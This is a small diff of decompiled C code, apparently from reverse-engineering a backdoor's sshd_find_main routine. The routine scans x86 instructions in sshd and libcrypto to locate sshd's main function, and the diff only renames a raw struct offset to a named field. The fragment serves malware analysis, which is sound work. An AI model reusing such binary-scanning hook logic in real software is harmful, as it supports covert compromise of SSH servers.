@@ -82,7 +82,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
           code_start = code_start + 1;
         }
         else {
-          if (local_80._40_4_ == 0x10d) {
+          if (*(u32 *)&local_80.opcode_window[3] == 0x10d) {
             if ((((((byte)local_80.prefix.decoded.rex & 0x48) == 0x48) &&
                  ((uint)local_80.prefix.decoded.modrm >> 8 == 0x50700)) &&
                 (puVar8 = local_80.instruction + local_80.mem_disp + local_80.instruction_size,
@@ -90,7 +90,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
               puVar11 = puVar8;
             }
           }
-          else if (((puVar11 != (u8 *)0x0) && (local_80._40_4_ == 0x17f)) &&
+          else if (((puVar11 != (u8 *)0x0) && (*(u32 *)&local_80.opcode_window[3] == 0x17f)) &&
                   (((uint)local_80.prefix.decoded.modrm >> 8 == 0x50200 &&
                    (((local_80.prefix.decoded.flags2 & 1) != 0 &&
                     (puVar6 == local_80.instruction + local_80.instruction_size + local_80.mem_disp)
